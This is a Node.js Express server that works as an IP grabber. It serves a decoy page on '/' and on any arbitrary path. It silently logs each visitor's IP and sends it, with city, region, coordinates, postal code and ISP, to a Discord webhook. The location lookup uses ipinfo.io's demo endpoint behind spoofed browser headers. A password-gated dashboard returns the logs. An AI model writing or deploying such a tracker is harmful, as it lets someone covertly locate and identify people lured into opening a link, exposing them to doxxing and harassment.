var fs = require('fs');
var http = require('http');
var https = require('https');
const sleep = (milliseconds) => {return new Promise(resolve => setTimeout(resolve, milliseconds));};
const fetch = require('node-fetch');
const dateformat = require('dateformat');

var config  = JSON.parse(fs.readFileSync('conf.json', 'utf8'));

var privateKey, certificate, credentials

if(config['Https'] == true) {
    privateKey  = fs.readFileSync(config['Https-privateKey'], 'utf8');
    certificate = fs.readFileSync(config['Https-certificate'], 'utf8');
    credentials = {key: privateKey, cert: certificate};
}

var express = require('express');
var app = express();

app.use(express.json());
app.set('trust proxy', true);

let old;

async function save(ip, from){
    let time = dateformat(new Date(), 'dddd, mmmm dS, yyyy, h:MM:ss TT');
    if(from == null)
        from = '/';
    old = fs.readFileSync('logs.txt', 'utf8');
    let data = `${old}-${time}- ${ip} -- From ${from}\n`
    fs.writeFile('logs.txt', data, function (err, data) {if(err) throw err});
}

app.post("/login", (req, res) => {
    if(config['Password']==(req.body)['Password']){
        res.sendFile(__dirname+'/'+'logs.txt')
    } else {
        res.redirect('/LoginFail')
    }
})

app.get("/", (req, res) => {
    var ip;
    if((req.headers).hasOwnProperty('x-forwarded-for'))
        ip = req.headers['x-forwarded-for'];
    else 
        ip = req.connection.remoteAddress;
    
    if(config['Discord-webhook'] !== null)
        if(config['ipinfo'] == false)
            fetch(config['Discord-webhook'], {
                headers: {"Content-Type":"application/json"},
                body: JSON.stringify({'content': `${ip}`}),
                method: 'POST'
            })
        else {
            fetch(`https://ipinfo.io/widget/demo/${ip}`, {
                headers: {
                    "Sec-Ch-Ua": '(Not(A:Brand";v="8", "Chromium";v="101',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                    "Sec-Ch-Ua-Platform": "Windows",
                    "Content-Type": "application/json",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://ipinfo.io/",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                }
            })
                .then(ipinfo => ipinfo.text()).then(ipinfo => {
                    console.log(ipinfo)
                    ipinfo = JSON.parse(ipinfo)['data']
                    let embed = {
                        "content": "",
                        "embeds": [
                            {
                                "type": "rich",
                                "title": `${ip}`,
                                "description": `IP: ${ip}\ncity: ${ipinfo['city']}\nregion: ${ipinfo['region']}\ncountry: ${ipinfo['country']}\nlocation: ${ipinfo['loc']}\nIPs: ${ipinfo['org']}\npostal: ${ipinfo['postal']}\ntimezone: ${ipinfo['timezone']}\n`,
                                "color": 0x00FFFF,
                                "url": `https://ipinfo.io/${ip}`
                            }
                        ]
                    }
                    fetch(config['Discord-webhook'], {
                        headers: {"Content-Type":"application/json"},
                        body: JSON.stringify(embed),
                        method: 'POST'
                    })
                })
        }
    res.sendFile(__dirname+"/"+config['html']);
    save(ip, null)
})

app.get("/:id", (req, res) => {
    let id = req.params.id
    if(id == config['Dashboard-URL']) {
        res.sendFile(__dirname+"/web/login.html")
    } else {
        if(id !== 'favicon.ico') {
            var ip;
            if((req.headers).hasOwnProperty('x-forwarded-for'))
                ip = req.headers['x-forwarded-for'];
            else 
                ip = req.connection.remoteAddress;
            
            if(config['Discord-webhook'] !== null)
                if(config['ipinfo'] == false)
                    fetch(config['Discord-webhook'], {
                        headers: {"Content-Type":"application/json"},
                        body: JSON.stringify({'content': `${ip} from ${id}`}),
                        method: 'POST'
                    })
                else {
                    fetch(`https://ipinfo.io/widget/demo/${ip}`, {
                        headers: {
                            "Sec-Ch-Ua": '(Not(A:Brand";v="8", "Chromium";v="101',
                            "Sec-Ch-Ua-Mobile": "?0",
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
                            "Sec-Ch-Ua-Platform": "Windows",
                            "Content-Type": "application/json",
                            "Sec-Fetch-Site": "same-origin",
                            "Sec-Fetch-Mode": "cors",
                            "Sec-Fetch-Dest": "empty",
                            "Referer": "https://ipinfo.io/",
                            "Accept-Encoding": "gzip, deflate",
                            "Accept-Language": "en-US,en;q=0.9"
                        }
                    })
                        .then(ipinfo => ipinfo.text()).then(ipinfo => {
                            console.log(ipinfo)
                            ipinfo = JSON.parse(ipinfo)['data']
                            let embed = {
                                "content": "",
                                "embeds": [
                                    {
                                        "type": "rich",
                                        "title": `${ip}`,
                                        "description": `IP: ${ip}\nFrom ${id}\ncity: ${ipinfo['city']}\nregion: ${ipinfo['region']}\ncountry: ${ipinfo['country']}\nlocation: ${ipinfo['loc']}\nIPs: ${ipinfo['org']}\npostal: ${ipinfo['postal']}\ntimezone: ${ipinfo['timezone']}\n`,
                                        "color": 0x00FFFF,
                                        "url": `https://ipinfo.io/${ip}`
                                    }
                                ]
                            }
                            fetch(config['Discord-webhook'], {
                                headers: {"Content-Type":"application/json"},
                                body: JSON.stringify(embed),
                                method: 'POST'
                            })
                        })
                }
            res.sendFile(__dirname+"/"+config['html']);
            save(ip, id)
    
        }
    }
})

if(config['Https'] == true) {
    var httpsServer = https.createServer(credentials, app);
    httpsServer.listen(443);
}

var httpServer = http.createServer(app);
httpServer.listen(80);
